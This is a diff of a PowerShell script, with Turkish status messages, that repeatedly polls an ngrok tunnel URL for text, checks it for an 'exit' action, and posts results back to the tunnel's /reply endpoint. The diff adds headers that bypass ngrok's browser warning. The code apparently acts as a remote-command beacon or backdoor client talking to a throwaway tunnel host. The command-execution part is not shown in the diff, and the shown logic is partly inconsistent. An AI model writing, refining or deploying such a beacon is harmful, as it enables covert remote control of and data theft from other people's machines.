@@ -1,11 +1,22 @@
-$baseUrl = "https://receiver-deposit-incentives-closure.trycloudflare.com"
-$url = "127.0.0.1:8092/temp.txt"
+$baseUrl = "https://stoplight-gender-tyke.ngrok-free.dev"
+$url = "https://stoplight-gender-tyke.ngrok-free.dev/temp.txt"
 $resp="s"
+$headers = @{
+    "ngrok-skip-browser-warning" = "1"
+}
 while ($true) {
     try {
 
-        $response= (Invoke-WebRequest -Uri $url).Content
-        Start-Sleep -Seconds 5
+        $response = Invoke-WebRequest `
+        -Uri $url `
+        -Method Get `
+        -Headers $headers `
+        -UseBasicParsing
+
+        $response.Content
+        $response = $response.Content.Substring(0, [Math]::Min(500, $response.Content.Length))
+        #$response= (Invoke-WebRequest -Uri $url).Content
+        Start-Sleep -Seconds 2
         if ($response.action -eq "exit") {
             Write-Host "Sunucu oturumu kapattı."
             break
@@ -23,11 +34,11 @@ while ($true) {
                 message = $result
             }
 
-            Invoke-RestMethod `
-                -Uri "$baseUrl/reply" `
-                -Method Post `
-                -ContentType "application/x-www-form-urlencoded" `
-                -Body $body 
+                   Invoke-RestMethod `
+                        -Uri "$baseUrl/reply" `
+                        -Method Post `
+                        -Headers @{ "ngrok-skip-browser-warning" = "1" } `
+                        -Body $body
 
             Write-Host "Yanıt sunucuya gönderildi."
         }
